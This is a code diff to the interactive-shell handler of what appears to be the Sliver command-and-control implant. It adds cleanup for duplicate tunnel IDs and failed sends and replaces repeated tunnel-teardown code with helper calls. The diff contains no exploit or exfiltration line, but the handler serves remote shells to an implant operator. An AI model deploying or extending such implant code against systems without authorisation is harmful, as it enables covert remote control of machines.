@@ -88,16 +88,23 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		systemShell.Stdout,
 		systemShell.Stderr,
 	)
-	connection.AddTunnel(tunnel)
-
 	session := shell.NewSession(systemShell)
+	if !connection.AddTunnel(tunnel) {
+		session.Stop()
+		tunnel.Close()
+		_ = systemShell.Wait()
+		shellResp, _ := proto.Marshal(&sliverpb.Shell{
+			Response: &commonpb.Response{Err: "shell tunnel ID is already active"},
+		})
+		reportError(envelope, connection, shellResp)
+		return
+	}
+
 	if !shell.RegisterSession(tunnel.ID, session) {
 		// Tunnel handlers are dispatched concurrently. A close can overtake this
 		// request while the process is starting; in that case registration stops
 		// the process and declines to publish a shell that can no longer be closed.
-		connection.RemoveTunnel(tunnel.ID)
-		tunnel.Close()
-		tunnelDataCache.DeleteTun(tunnel.ID)
+		connection.CloseTunnelRemote(tunnel)
 		_ = systemShell.Wait()
 		shellResp, _ := proto.Marshal(&sliverpb.Shell{
 			Response: &commonpb.Response{Err: "shell tunnel closed during startup"},
@@ -113,9 +120,15 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		Path:     shellReq.Path,
 		TunnelID: shellReq.TunnelID,
 	})
-	connection.Send <- &sliverpb.Envelope{
+	if !connection.SendEnvelope(&sliverpb.Envelope{
 		ID:   envelope.ID,
 		Data: shellResp,
+	}) {
+		shell.UnregisterSession(tunnel.ID)
+		session.Stop()
+		connection.CloseTunnelRemote(tunnel)
+		_ = systemShell.Wait()
+		return
 	}
 
 	var finalizeOnce sync.Once
@@ -126,18 +139,7 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 			// {{end}}
 
 			shell.UnregisterSession(tunnel.ID)
-			connection.RemoveTunnel(tunnel.ID)
-			tunnel.Close()
-			tunnelDataCache.DeleteTun(tunnel.ID)
-
-			tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
-				Closed:   true,
-				TunnelID: tunnel.ID,
-			})
-			connection.Send <- &sliverpb.Envelope{
-				Type: sliverpb.MsgTunnelClose,
-				Data: tunnelClose,
-			}
+			connection.CloseTunnelLocal(tunnel)
 		})
 	}
 
